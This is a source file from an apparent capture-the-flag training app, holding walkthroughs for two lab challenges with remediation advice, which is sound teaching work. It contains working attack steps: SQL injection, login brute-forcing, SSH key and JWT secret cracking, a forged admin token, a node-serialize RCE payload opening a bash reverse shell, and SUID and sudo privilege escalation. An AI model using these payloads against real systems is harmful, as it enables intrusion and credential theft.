// src/lib/solutions.js
//
// Data-driven per-challenge solution walkthroughs, rendered generically by
// src/pages/SolutionPage.jsx. Keyed by `docker_image` — the same key
// MissionBrief.jsx's OBJECTIVES_BY_IMAGE uses to look up a challenge
// module's content, so the whole app shares one identifier convention per
// challenge instead of inventing a second one here.
//
// TO ADD A NEW CHALLENGE'S SOLUTION: add a new top-level key (its
// docker_image, e.g. the 'chainbreak-challenge-2' entry below) with the
// same shape as 'chainbreak-challenge-1'. Nothing in SolutionPage.jsx needs
// to change — it renders whatever `layers.{web,container,cloud}.steps` it
// finds for the current challenge's docker_image. A layer with an empty
// `steps` array (or `comingSoon: true`) renders a clean "not written yet" /
// "coming soon" placeholder through the same generic path.
//
// STEP SHAPE:
//   {
//     title:          string  — e.g. "Step 1 — Bypass authentication via SQL injection"
//     layer:          'web' | 'container' | 'cloud'
//     category:       string, optional — OWASP category / technique label
//     explanation:    string  — 2-4 sentences: what the vuln is, why it
//                                works, what the learner is exploiting
//     commands:       [{ label?: string, code: string }, ...]
//     expectedResult: string, optional — what the learner should see
//     flag:           string, optional — the flag captured at this step
//   }

export const SOLUTIONS = {
  // ── Challenge 1 — reference implementation ──────────────────────────────
  // Every command and expected-result block below was run against the real
  // built challenge (a live chainbreak-challenge-1 target paired with its
  // workstation container) and is copied verbatim from the actual output —
  // not reconstructed from memory.
  'chainbreak-challenge-1': {
    title: 'Challenge 1 — SQL Injection to Cloud Credential Pivot',
    subtitle:
      'A single unsanitised login query cascades into a full compromise: ' +
      'authentication bypass leads to a broken-access-control endpoint, ' +
      'which leaks a passphrase-protected SSH key, which pivots onto the ' +
      'container, which escalates to root via a misconfigured SUID binary, ' +
      'which finally exposes leaked AWS credentials — the bridge to the ' +
      'cloud layer.',
    layers: {
      web: {
        steps: [
          {
            title: 'Step 1 — Bypass authentication via SQL injection',
            layer: 'web',
            category: 'A03:2021 Injection',
            explanation:
              "The login endpoint builds its SQL query by concatenating the " +
              "raw username and password straight into the query string, " +
              "instead of using parameterised placeholders. Closing the " +
              "password string early and appending OR '1'='1' turns the " +
              "WHERE clause into a tautology that matches every row in the " +
              "table, so the query returns a user regardless of what " +
              "password was supplied. The admin row was seeded first, so " +
              "LIMIT 1 returns admin.",
            commands: [
              {
                label: 'Send the injection payload',
                code:
`curl -s -X POST http://web-challenge-1:3000/login \\
  -H "Content-Type: application/json" \\
  -d "{\\"username\\":\\"admin\\",\\"password\\":\\"anything' OR '1'='1\\"}"`,
              },
            ],
            expectedResult:
`{"success":true,"message":"[+] Authentication bypassed via SQL injection","username":"admin","role":"admin","token":"<JWT — save this for the next steps>","flag":"flag{sqli_owasp_bypass}"}`,
            flag: 'flag{sqli_owasp_bypass}',
          },
          {
            title: 'Step 2 — Escalate access via broken access control',
            layer: 'web',
            category: 'A01:2021 Broken Access Control',
            explanation:
              'The /api/users endpoint checks that the caller has a valid ' +
              'JWT (authentication) but never checks which role that JWT ' +
              'carries (authorization) — any logged-in user, not just an ' +
              'admin, can list every account. Authenticated is not the ' +
              'same as authorized; that missing role check is the bug.',
            commands: [
              {
                label: 'Reuse the JWT from Step 1',
                code:
`curl -s http://web-challenge-1:3000/api/users \\
  -H "Authorization: Bearer <TOKEN_FROM_STEP_1>"`,
              },
            ],
            expectedResult:
`{"users":[{"id":1,"username":"admin",...},{"id":2,"username":"alice",...},{"id":3,"username":"bob",...}],"flag":"flag{sqli_broken_access}","_links":{"backups":"/api/admin/backup?file=README.txt"}}

The _links.backups field is the trail to the container layer — follow it next.`,
            flag: 'flag{sqli_broken_access}',
          },
        ],
      },
      container: {
        steps: [
          {
            title: 'Step 3 — Leak the SSH deploy key',
            layer: 'container',
            category: 'Sensitive file exposure',
            explanation:
              'The backup endpoint takes a file query parameter and joins ' +
              'it onto a backups directory with no filename allowlist and ' +
              'no traversal check — it will serve any file already in ' +
              'that directory, not just the manifest it was designed for. ' +
              'The manifest names the actual deploy-key filename, which is ' +
              'itself readable through the exact same endpoint.',
            commands: [
              {
                label: 'Read the backup manifest first',
                code:
`curl -s "http://web-challenge-1:3000/api/admin/backup?file=README.txt" \\
  -H "Authorization: Bearer <TOKEN>"`,
              },
              {
                label: 'The manifest names paymentsvc_key — fetch it',
                code:
`curl -s "http://web-challenge-1:3000/api/admin/backup?file=paymentsvc_key" \\
  -H "Authorization: Bearer <TOKEN>" \\
  -o paymentsvc_key`,
              },
              {
                label: 'SSH refuses to use a key with open permissions',
                code: 'chmod 600 paymentsvc_key',
              },
            ],
            expectedResult:
`Nightly backup manifest — payments service
-------------------------------------------
 - paymentsvc_key            (ssh deploy key — DO NOT commit, DO NOT expose)
 - db-dump-2026-08-20.sql.gz

Reminder: all deploy keys are passphrase-protected per security policy —
the private key file alone should never be sufficient for access.

The second curl saves an OpenSSH ed25519 private key to ./paymentsvc_key.
It is passphrase-protected — you cannot use it yet.`,
          },
          {
            title: 'Step 4 — Crack the key passphrase offline',
            layer: 'container',
            category: 'Credential cracking',
            explanation:
              'A leaked key is not a working credential on its own if it is ' +
              'passphrase-protected — the passphrase itself has to be ' +
              'recovered. Because the key format embeds a KDF-derived check ' +
              'value, candidate passphrases can be tested entirely offline ' +
              '(no network requests, no lockouts) by converting the key to ' +
              'a crackable hash format and running it through a wordlist. A ' +
              'short, dictionary-word-plus-digits passphrase like this one ' +
              'falls quickly to a wordlist attack.',
            commands: [
              {
                label: 'Convert the key to a John-crackable hash',
                code: 'ssh2john paymentsvc_key > paymentsvc_key.hash',
              },
              {
                label: 'Run the wordlist attack',
                code: 'john --wordlist=/usr/share/wordlists/rockyou.txt paymentsvc_key.hash',
              },
              {
                label: 'Reveal the cracked passphrase',
                code: 'john --show paymentsvc_key.hash',
              },
            ],
            expectedResult:
`sunshine12       (paymentsvc_key)
1g 0:00:00:56 DONE ... 1.705g/s 1.705p/s 1.705c/s 1.705C/s

paymentsvc_key:sunshine12

1 password hash cracked, 0 left`,
          },
          {
            title: 'Step 5 — Pivot onto the container over SSH',
            layer: 'container',
            category: 'Lateral movement / credential pivot',
            explanation:
              'With both the key and its passphrase in hand, the leaked ' +
              'credential can be reused exactly as the legitimate service ' +
              'account would — this is credential-based lateral movement: ' +
              'no new vulnerability is exploited here, just a stolen key ' +
              'used for its intended purpose against a host that trusts it.',
            commands: [
              {
                label: 'Connect as paymentsvc using the cracked key',
                code: 'ssh -i paymentsvc_key paymentsvc@web-challenge-1',
              },
            ],
            expectedResult:
`Enter passphrase for key 'paymentsvc_key': sunshine12

[+] SSH pivot successful — flag{sqli_ssh_pivot}
paymentsvc@web-challenge-1:~$`,
            flag: 'flag{sqli_ssh_pivot}',
          },
          {
            title: 'Step 6 — Escalate to root via a SUID binary',
            layer: 'container',
            category: 'Privilege escalation (SUID)',
            explanation:
              'A root-owned binary with the SUID bit set runs with its ' +
              "owner's privileges — root's — no matter which user " +
              'executes it. This box has a custom "backup helper" that was ' +
              'made setuid-root instead of being given a narrow, audited ' +
              'capability. Since it unconditionally calls setuid(0) and ' +
              'execs a shell, any local user who can run it gets a root ' +
              'shell.',
            commands: [
              {
                label: 'Find SUID binaries on the box',
                code: 'find / -perm -4000 2>/dev/null',
              },
              {
                label: 'Run the misconfigured SUID binary',
                code: '/usr/local/bin/backup-helper',
              },
              {
                label: 'Confirm the escalation and read the flag',
                code: 'whoami && cat /root/flag.txt',
              },
            ],
            expectedResult:
`$ find / -perm -4000 2>/dev/null
/usr/local/bin/backup-helper
...
$ /usr/local/bin/backup-helper
root@web-challenge-1:/home/paymentsvc# whoami
root
root@web-challenge-1:/home/paymentsvc# cat /root/flag.txt
flag{sqli_privesc_root}`,
            flag: 'flag{sqli_privesc_root}',
          },
          {
            title: 'Step 7 — Find the leaked cloud credentials',
            layer: 'container',
            category: 'Container misconfiguration / credential exposure',
            explanation:
              'This container was over-provisioned: it carries a full set ' +
              'of AWS deploy credentials it has no operational need for, ' +
              'sitting in the default AWS CLI config path. This is a ' +
              'common real-world finding — credentials baked into an ' +
              'image "just in case" and then forgotten. It is only ' +
              'reachable now because the file is root-owned and mode 600; ' +
              'the SUID escalation in Step 6 was a genuine prerequisite, ' +
              'not a formality.',
            commands: [
              {
                label: 'Read the AWS credentials file as root',
                code: 'cat /root/.aws/credentials',
              },
            ],
            expectedResult:
`[default]
aws_access_key_id = AKIAAWSDEPLOYBOT2026
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# TODO: rotate — deploy bot creds should never have shipped in this image
# flag{sqli_docker_misconfig}

These are the credentials that bridge into the cloud layer below.`,
            flag: 'flag{sqli_docker_misconfig}',
          },
        ],
      },
      cloud: {
        // Not built yet — see note. Leave `steps` empty rather than
        // fabricating commands that don't work against any real target.
        comingSoon: true,
        note:
          'The cloud layer (using the credentials leaked in Step 7 to ' +
          'reach a real IAM/S3 target) is not built yet — no ' +
          'infrastructure exists to exploit safely, so no commands are ' +
          'published here until it is. This section will be filled in ' +
          'once that layer ships.',
        steps: [],
      },
    },
  },

  // ── Challenge 2 — four web vulns on one app, then a container escape ────
  // Every command and expected-result block below was run against the real
  // built challenge (a standalone chainbreak-challenge-2 target on the same
  // kind of per-session network as production — target aliased
  // web-challenge-2, workstation aliased workstation) and is copied
  // verbatim from the actual output, including a full reverse-shell RCE
  // fired end-to-end — not reconstructed from memory. `remediation` is an
  // optional field (see the STEP SHAPE note above) used here for the first
  // time; SolutionWalkthrough renders it only when present, so Challenge
  // 1's steps (which don't set it) are unaffected.
  'chainbreak-challenge-2': {
    title: 'Challenge 2 — Four Web Vulnerabilities to Container Root',
    subtitle:
      'One application, four independent OWASP findings that chain together: ' +
      'a mishandled error leaks the vulnerable component, a brute-forceable ' +
      'login gets a foothold token, a weak JWT secret lets you forge admin ' +
      'access, and the same deserialisation bug that leaked the error also ' +
      'gives full code execution — which a container misconfiguration then ' +
      'escalates to root.',
    layers: {
      web: {
        steps: [
          {
            title: 'Step 1 — Leak internals via a mishandled error (A10)',
            layer: 'web',
            category: 'A10:2021 Mishandling of Exceptional Conditions',
            explanation:
              'Every request runs through middleware that tries to restore ' +
              'preferences from a profile cookie. When that cookie is not ' +
              'valid data, the resulting parse error is caught — but ' +
              'mishandled: the raw stack trace (which names the vulnerable ' +
              'node-serialize library) and a debug token are sent straight ' +
              'back to the client instead of a generic error message.',
            commands: [
              {
                label: 'Send an invalid profile cookie',
                code: `curl -s http://web-challenge-2:3000/ -b "profile=$(echo -n 'garbage' | base64)"`,
              },
            ],
            expectedResult:
`<h1>Could not restore profile</h1>
<pre>SyntaxError: Unexpected token g in JSON at position 0
    at JSON.parse (<anonymous>)
    at exports.unserialize (/app/node_modules/node-serialize/lib/serialize.js:62:16)
    at /app/app.js:47:31
    ...</pre>
<!-- debug ref: flag{verbose_error_disclosure} -->

The stack trace naming node-serialize is the real prize here — it points
straight at Step 4's vulnerability.`,
            flag: 'flag{verbose_error_disclosure}',
            remediation:
              'Catch deserialisation errors and return a generic message ' +
              '("invalid request") with no stack trace or library detail. ' +
              'Log the real error server-side only, never in the response body.',
          },
          {
            title: 'Step 2 — Brute-force the support login (A07)',
            layer: 'web',
            category: 'A07:2021 Identification and Authentication Failures',
            explanation:
              'The login page hints that "support staff sign in with the ' +
              'standard support account" — that names the username outright. ' +
              'The account has a weak password and the endpoint applies no ' +
              'rate limiting, delay, or lockout, so it can be brute-forced ' +
              'against a wordlist with no risk of being locked out.',
            commands: [
              {
                label: "View the login page (reveals the username hint)",
                code: 'curl -s http://web-challenge-2:3000/login',
              },
              {
                label: 'Brute-force the password with a wordlist',
                code:
`for pw in $(cat /usr/share/wordlists/rockyou.txt); do
  resp=$(curl -s -X POST http://web-challenge-2:3000/login \\
    -H "Content-Type: application/x-www-form-urlencoded" \\
    -d "username=support&password=$pw")
  echo "$resp" | grep -q "\\"flag\\"" && { echo "password: $pw"; echo "$resp"; break; }
done`,
              },
            ],
            expectedResult:
`password: support123
{"message":"Welcome, support","role":"support","token":"<JWT — save this for the next step>","flag":"flag{weak_auth_no_lockout}"}`,
            flag: 'flag{weak_auth_no_lockout}',
            remediation:
              'Add rate limiting and account lockout (or exponential ' +
              'backoff) on login attempts, enforce a real password policy, ' +
              'and remove any hints that name valid usernames.',
          },
          {
            title: 'Step 3 — Crack the JWT secret and forge an admin token (A04)',
            layer: 'web',
            category: 'A04:2021 Cryptographic Failures',
            explanation:
              'Tokens are signed with HS256 — a SYMMETRIC algorithm, so ' +
              'the same secret that verifies a signature can also create ' +
              'one. That secret turns out to be a short, dictionary-word ' +
              'value, crackable offline by trying wordlist candidates ' +
              'against the token you already have (no server requests, no ' +
              'rate limit to worry about). Once known, you can sign a ' +
              'brand-new token with role "admin" yourself — the app never ' +
              'issues one; forging it is the intended path. (The same ' +
              'attack is what hashcat -m 16500 automates against a captured ' +
              'HS256 JWT.)',
            commands: [
              {
                label: 'Save the cracking script',
                code:
`cat > crack_jwt.py << 'EOF'
import hmac, hashlib, base64, sys

token = sys.argv[1]
h, p, s = token.split('.')

def b64d(x):
    return base64.urlsafe_b64decode(x + '=' * (-len(x) % 4))

target = b64d(s)
signing_input = f'{h}.{p}'.encode()

for line in open('/usr/share/wordlists/rockyou.txt'):
    secret = line.rstrip('\\n')
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    if hmac.compare_digest(sig, target):
        print('SECRET FOUND:', secret)
        sys.exit(0)
print('not found')
EOF`,
              },
              {
                label: 'Run it against the token from Step 2',
                code: 'python3 crack_jwt.py <TOKEN_FROM_STEP_2>',
              },
              {
                label: 'Save the forging script',
                code:
`cat > forge_admin.py << 'EOF'
import hmac, hashlib, base64, json, time

def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = {'alg': 'HS256', 'typ': 'JWT'}
payload = {'sub': 'support', 'role': 'admin', 'iat': int(time.time()), 'exp': int(time.time()) + 3600}

h = b64u(json.dumps(header, separators=(',', ':')).encode())
p = b64u(json.dumps(payload, separators=(',', ':')).encode())
sig = b64u(hmac.new(b'<CRACKED_SECRET>', f'{h}.{p}'.encode(), hashlib.sha256).digest())

print(f'{h}.{p}.{sig}')
EOF`,
              },
              {
                label: 'Forge the token and hit /admin',
                code:
`FORGED=$(python3 forge_admin.py)
curl -s http://web-challenge-2:3000/admin -H "Authorization: Bearer $FORGED"`,
              },
            ],
            expectedResult:
`SECRET FOUND: killer

{"message":"Admin console","flag":"flag{jwt_secret_cracked}"}`,
            flag: 'flag{jwt_secret_cracked}',
            remediation:
              'Use a long, random, high-entropy signing secret (or switch ' +
              'to asymmetric RS256/ES256 so verification and signing keys ' +
              'differ) and rotate it regularly. Never derive a JWT secret ' +
              'from a short or dictionary-guessable value.',
          },
          {
            title: 'Step 4 — Remote code execution via insecure deserialisation (A03)',
            layer: 'web',
            category: 'A03:2021 Software Supply Chain Failures',
            explanation:
              'node-serialize@0.0.4 has a known flaw (CVE-2017-5941): when ' +
              'unserialising a value, if a string starts with ' +
              '_$$ND_FUNC$$_, the library evals everything after that ' +
              'prefix as a live JavaScript function — including calling it ' +
              'immediately. The profile cookie decoded in Step 1 is exactly ' +
              'that sink, and it is entirely attacker-controlled, so a ' +
              'crafted cookie value becomes arbitrary code execution on the ' +
              'server.',
            commands: [
              {
                label: 'Save the exploit script (start a listener on this host first)',
                code:
`cat > rce_payload.py << 'EOF'
import base64, json

lhost, lport = "workstation", "4444"   # your workstation's network alias
func_body = (
    "function(){require('child_process')"
    ".exec(\\"bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'\\");}()" % (lhost, lport)
)
obj = {"user": "guest", "theme": "light", "role": "_$$ND_FUNC$$_" + func_body}
print(base64.b64encode(json.dumps(obj).encode()).decode())
EOF`,
              },
              {
                label: 'Start a listener, then fire the payload',
                code:
`nc -lvnp 4444 &
curl -s http://web-challenge-2:3000/ -b "profile=$(python3 rce_payload.py)"`,
              },
              {
                label: 'Inside the resulting shell',
                code: 'id\ncat /app/flag.txt',
              },
            ],
            expectedResult:
`websvc@<container-id>:/app$ id; cat /app/flag.txt
uid=1001(websvc) gid=1001(websvc) groups=1001(websvc)
flag{deserialize_rce_foothold}`,
            flag: 'flag{deserialize_rce_foothold}',
            remediation:
              'Never deserialise untrusted input with a library that can ' +
              'execute embedded code (node-serialize does this by design). ' +
              'Use plain JSON.parse and validate/allowlist the fields you ' +
              'actually expect, and keep dependencies patched or replaced ' +
              'once a CVE like this one is public.',
          },
        ],
      },
      container: {
        steps: [
          {
            title: 'Step 5 — Escalate to root via a sudo misconfiguration',
            layer: 'container',
            category: 'Container privilege escalation',
            explanation:
              'The service account has passwordless sudo on /usr/bin/find ' +
              '— a leftover from what was probably meant to be a scoped ' +
              'log-cleanup job. find\'s -exec flag runs an arbitrary ' +
              'command, and because the whole invocation runs via sudo, ' +
              'that command runs as root too. This is a well-known ' +
              'GTFOBins pattern: any sudo rule on a binary with -exec/shell-' +
              'out capability is equivalent to full root access.',
            commands: [
              {
                label: 'The root flag is not readable as websvc',
                code: 'cat /root/flag.txt',
              },
              {
                label: 'Check what this account can run as root',
                code: 'sudo -l',
              },
              {
                label: 'Use find -exec to read the flag as root',
                code: String.raw`sudo find /root/flag.txt -exec cat {} \;`,
              },
              {
                label: 'Alternative: a full interactive root shell',
                code: String.raw`sudo find . -maxdepth 0 -exec /bin/bash \; -quit`,
              },
            ],
            expectedResult:
`$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied

$ sudo -l
User websvc may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/find

$ sudo find /root/flag.txt -exec cat {} \\;
flag{container_root_escalation}`,
            flag: 'flag{container_root_escalation}',
            remediation:
              'Never grant sudo on a binary with shell-out or -exec ' +
              'capability (check any sudoers rule against GTFOBins before ' +
              'shipping it). Scope sudo rules to the exact command AND ' +
              'arguments needed, or replace the ad-hoc rule with a ' +
              'purpose-built, minimally-privileged script.',
          },
        ],
      },
      cloud: {
        // Not built yet — see note. Leave `steps` empty rather than
        // fabricating commands that don't work against any real target.
        comingSoon: true,
        note:
          'Challenge 2 does not have a cloud layer yet — no infrastructure ' +
          'exists to exploit safely, so no commands are published here ' +
          'until it is built.',
        steps: [],
      },
    },
  },
}

export function getSolution(dockerImage) {
  return SOLUTIONS[dockerImage] ?? null
}
